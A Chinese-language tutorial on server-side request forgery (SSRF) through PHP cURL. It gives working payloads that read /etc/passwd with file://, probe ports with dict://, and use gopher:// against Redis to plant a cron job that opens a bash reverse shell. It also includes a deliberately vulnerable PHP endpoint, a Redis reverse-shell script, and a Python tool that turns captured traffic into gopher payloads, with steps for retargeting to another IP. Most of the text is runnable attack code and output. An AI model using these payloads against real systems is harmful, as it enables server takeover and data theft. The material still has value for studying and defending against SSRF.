SSRF漏洞

1. 漏洞简介
SSRF(Server-side Request Forge, 服务端请求伪造)。
由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。
2. 漏洞利用
自从煤老板的paper放出来过后，SSRF逐渐被大家利用和重视起来。

2.1 本地利用
拿PHP常出现问题的cURL举例。

可以看到cURL支持大量的协议，例如file, dict, gopher, http

➜ curl -V
curl 7.43.0 (x86_64-apple-darwin15.0) libcurl/7.43.0 SecureTransport zlib/1.2.5
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp
Features: AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz UnixSockets
本地利用姿势：

# 利用file协议查看文件
curl -v 'file:///etc/passwd'

# 利用dict探测端口
curl -v 'dict://127.0.0.1:22'
curl -v 'dict://127.0.0.1:6379/info'

# 利用gopher协议反弹shell
```
curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'
```
2.2 远程利用
漏洞代码ssrf.php（未做任何SSRF防御）
```

function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}

$url = $_GET['url'];
curl($url); 
```
远程利用方式：

# 利用file协议任意文件读取
curl -v 'http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd'

# 利用dict协议查看端口
curl -v 'http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22'

# 利用gopher协议反弹shell
```
curl -v 'http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'
```
漏洞代码ssrf2.php

限制协议为HTTP、HTTPS
设置跳转重定向为True（默认不跳转）
```
<?php
function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);
    // 限制为HTTPS、HTTP协议
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}

$url = $_GET['url'];
curl($url);
?>
```
此时，再使用dict协议已经不成功。

http://sec.com:8082/sec/ssrf2.php?url=dict://127.0.0.1:6379/info
3. 如何转换成gopher协议
刚一开始看到这个协议，不知道如何转换。希望写点经验给大家，有不对的地方，还望指出。

3.1 redis反弹shell
先写一个redis反弹shell的bash脚本如下：
我不喜欢用flushall，太不友好。
```
echo -e "\n\n\n*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\n\n\n"|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/
redis-cli -h $1 -p $2 config set dbfilename root
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
```
该代码很简单，在redis的第0个数据库中添加key为1，value为\n\n\n*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\n\n\n\n的字段。最后会多出一个n是因为echo重定向最后会自带一个换行符。

执行脚本命令：
```
bash shell.sh 127.0.0.1 6379
```
想获取Redis攻击的TCP数据包，可以使用socat进行端口转发。转发命令如下：

socat -v tcp-listen:4444,fork tcp-connect:localhost:6379
意思是将本地的4444端口转发到本地的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。

执行脚本

bash shell.sh 127.0.0.1 4444
捕获到数据如下：
```

> 2017/10/11 01:24:52.432446  length=85 from=0 to=84
*3\r
$3\r
set\r
$1\r
1\r
$58\r



*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1



\r
< 2017/10/11 01:24:52.432685  length=5 from=0 to=4
+OK\r
> 2017/10/11 01:24:52.435153  length=57 from=0 to=56
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$16\r
/var/spool/cron/\r
< 2017/10/11 01:24:52.435332  length=5 from=0 to=4
+OK\r
> 2017/10/11 01:24:52.437594  length=52 from=0 to=51
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$4\r
root\r
< 2017/10/11 01:24:52.437760  length=5 from=0 to=4
+OK\r
> 2017/10/11 01:24:52.439943  length=14 from=0 to=13
*1\r
$4\r
save\r
< 2017/10/11 01:24:52.443318  length=5 from=0 to=4
+OK\r
> 2017/10/11 01:24:52.446034  length=14 from=0 to=13
*1\r
$4\r
quit\r
< 2017/10/11 01:24:52.446148  length=5 from=0 to=4
+OK\r
```
转换规则如下：

如果第一个字符是>或者< 那么丢弃该行字符串，表示请求和返回的时间。
如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。
将\r字符串替换成%0d%0a
空白行替换为%0a
写了个脚本进行转换：tran2gopher.py
```python
python tran2gopher.py socat.log
#coding: utf-8
#author: JoyChou
import sys

exp = ''

with open(sys.argv[1]) as f:
    for line in f.readlines():
        if line[0] in '><+':
            continue
        # 判断倒数第2、3字符串是否为\r
        elif line[-3:-1] == r'\r':
            # 如果该行只有\r，将\r替换成%0a%0d%0a
            if len(line) == 3:
                exp = exp + '%0a%0d%0a'
            else:
                line = line.replace(r'\r', '%0d%0a')
                # 去掉最后的换行符
                line = line.replace('\n', '')
                exp = exp + line
        # 判断是否是空行，空行替换为%0a
        elif line == '\x0a':
            exp = exp + '%0a'
        else:
            line = line.replace('\n', '')
            exp = exp + line
print exp
```
结果为：
```
*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```
需要注意的是，如果要换IP和端口，前面的$58也需要更改，$58表示字符串长度为58个字节，上面的EXP即是%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0a，3+51+4=58。如果想换成42.256.24.73，那么$58需要改成$61，以此类推就行。

本地cURL测试是否成功写入：
```
curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'
```
返回5个OK

+OK
+OK
+OK
+OK
+OK
证明应该没有问题。那再检测以下Redis写入的字段和crontab的内容。

检测Redis数据库的字段为"\n\n\n*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\n\n\n\n"
检测crontab的内容也没有问题
